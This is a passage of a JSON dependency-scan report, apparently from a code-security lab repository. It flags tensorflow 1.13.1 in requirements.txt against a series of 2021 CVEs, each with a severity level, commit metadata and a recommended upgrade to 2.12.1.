            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29527 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29527)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7ce807c6840e56658ae9c2965ef34544aa86fba9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29603",
          "ruleIndex": 78,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29603 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29603](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29603)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9b502b7a29132ff413ff105790fe7bfe90eee306"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29586",
          "ruleIndex": 79,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29586 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29586)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "512ef6169aac0fa4002b14a5457b108bfb1728b5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29567",
          "ruleIndex": 80,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29567 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29567)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d894adade5ff08fddca182ad31774f26ec9b1256"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29619",
          "ruleIndex": 81,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29619 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29619)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e982085e06f89887dd6aed6a65c17a0aaf14b054"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29533",
          "ruleIndex": 82,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29533 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29533)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1c4aa66b6522c95050fe60613fbe39a6712777cd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29581",
          "ruleIndex": 83,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29581 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29581)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "53c15b5e2b60f176e462bf14dd9be4b735ff2c5d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29523",
          "ruleIndex": 84,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29523 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29523)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a16349c4c1e33894c3000b290eedb97c6de7cc9f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29545",
          "ruleIndex": 85,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29545 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29545](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29545)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e6fc1dc09865ba95dd56a35174ddf633062add72"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29617",
          "ruleIndex": 86,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29617 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29617](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29617)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2eaf0557e9f09a4f67d00e34c983ed4032e69063"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29519",
          "ruleIndex": 87,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29519 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29519](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29519)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2ce33ee4abcb2d48ad93331bffad69b0eae3c821"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29526",
          "ruleIndex": 88,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29526 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29526](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29526)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "678f461d0b161c6b488ced5d65262331c9b36168"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29517",
          "ruleIndex": 89,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29517 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29517](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29517)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cc0b4c471f581dec8b1a72110132d0cce752d47d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29549",
          "ruleIndex": 90,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29549 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29549](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29549)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "eb85edeb8427c87b82c88bd382bae134fb189470"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29548",
          "ruleIndex": 91,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29548 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29548](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29548)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3b3aa44844c8441256f1385712dcae00e50a7999"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29541",
          "ruleIndex": 92,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29541 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29541](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29541)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f7d1d83ea9324491ef795953cc273c0b71d276e2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29591",
          "ruleIndex": 93,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29591 (severity: high, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29591)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
